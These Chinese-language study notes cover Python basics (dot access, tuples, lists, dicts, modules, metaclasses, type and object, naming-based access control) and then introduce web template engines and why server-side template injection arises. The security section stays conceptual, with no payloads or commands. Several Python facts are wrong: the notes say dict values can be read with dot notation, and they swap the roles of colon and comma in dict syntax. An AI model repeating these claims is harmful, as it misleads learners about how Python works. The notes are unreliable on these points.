Python前置知识

.使用

  1. 属性访问：使用点号可以访问对象的属性和方法。
    1. 例如，object.property 可以获取对象的属性值，
    2. object.method() 可以调用对象的方法。
  2. 模块导入：使用点号可以导入模块中的子模块、变量、函数或类
    1. 例如，import module.submodule 可以导入模块的子模块，
    2. from module import function 可以导入模块中的函数。
  3. 类成员访问：在类定义中，使用点号可以访问类的静态变量、类方法或类属性。
    1. 例如，ClassName.static_variable 可以访问类的静态变量，
    2. ClassName.class_method() 可以调用类的方法。
  4. 字典键访问：在字典中，使用点号可以通过键来访问相应的值
    1. 例如 dictionary.key 可以获取字典中键对应的值
    2. 但是元组不可以

容器

  1. tuple元组: 不可变(值不可以杯修改、添加和删除)，类似数组

    1. 对于可变对象: 如果元组中包含可变对象（如列表），则可以在可变对象中修改其值

  2. list列表: 可改变的tuple，也使用索引访问元素

    1. list.remove(...)和list.append(...)，支持切片操作

  3. dict字典: 每个键值对之间使用冒号 : 分隔，键和值之间使用逗号 , 分隔。键必须是不可变的类型（如字符串（python中的字符串是不可变的、整数、浮点数或元组），而值可以是任意类型，使用[]或者.来访问元素

模块和包

  1. python文件就是一个python模块，也可以是内置的模块，可以从中导入函数和变量
  2. 通过目录结构+__init__.py(3.3之后不需要)可以创建包来提供命名空间并进行组织
  3. 类似于cpp中的库文件

元类

明确目标

可以先见《Python原型链污染》这篇博客
这一章就为了理解这一句话: 在 Python 中，object 是所有类的基类，而 type 是所有类的元类

什么是元类

  1. 元类（Metaclass）是类的类。它负责创建类对象。

    1. 在 Python 中，类本身也是对象，这些对象是由元类创建的。
    2. 默认情况下，所有类都是由 type 元类创建的
    3. 作用：元类（Metaclass）是类的类。它负责创建类对象。在 Python 中，类本身也是对象，这些对象是由元类创建的。

  2. 自定义元类：元类通常通过继承 type 类来定义，并重写其 __new__或 __init__ 方法。

type与object

  1. object 类

    1. 用途：object 是所有类的基类。每个类（无论是用户定义的类还是内置类）都隐式或显式地继承自 object。
    2. 特点：
      1. 所有对象都是 object 的实例
      2. object 提供了一些基本的方法，如 __str__、__repr__

  2. type 元类

    1. 用途：type 是所有类的元类。元类是类的类，负责创建类。
    2. 特点：
      1. 所有类都是 type 的实例。
      2. type 本身也是一个类，同时也是一个元类

  3. 二者的关系: 循环引用

    1. object 是 type 的实例：
      1. object 本身是一个类，它是 type 的实例。
    2. type 是 object 的子类：
      1. type 继承自 object，因此 type 也是 object 的实例
    3. 实现方面
      1. type 先于 object 存在：
      2. 在 Python 的启动过程中，首先创建 type 类。
      3. 然后使用 type 类来创建 object 类。

Python访问控制

  1. Python 通过命名约定来实现访问控制，而不是像其他语言（如 Java 或 C++）那样通过严格的关键字（如 private 或 protected）来实现
    1. 公有（Public）:成员名称没有任何前缀，可以在类的外部直接访问，比如self.public_attribute
    2. 保护（Protected）:成员名称以单下划线 _ 开头，这是一种约定，表示该成员仅供类内部或子类使用，外部不应直接访问；比如self._protected_attribute
    3. 私有（Private）:成员名称以双下划线 __ 开头，Python 会对名称进行名称修饰（name mangling），使其在类外部难以直接访问；示比如self.__private_attribute
  2. 并不安全: Python 的访问控制并非绝对安全，私有成员仍然可以通过名称修饰访问，保护成员和私有成员更多是一种约定，依赖于开发者的自觉

什么是模板？

*模板工作流

  1. 模板引擎:(这里特指用于Web开发的模板引擎)是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

    1. 模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

  2. 漏洞成因:服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性 –> 在模板渲染的时候进行了解析操作，支持代码的执行

    2. 如果使用固定了的模板，渲染后传入数据，就不存在模板注入了，比如一下的flask jinja2就不会模板注入
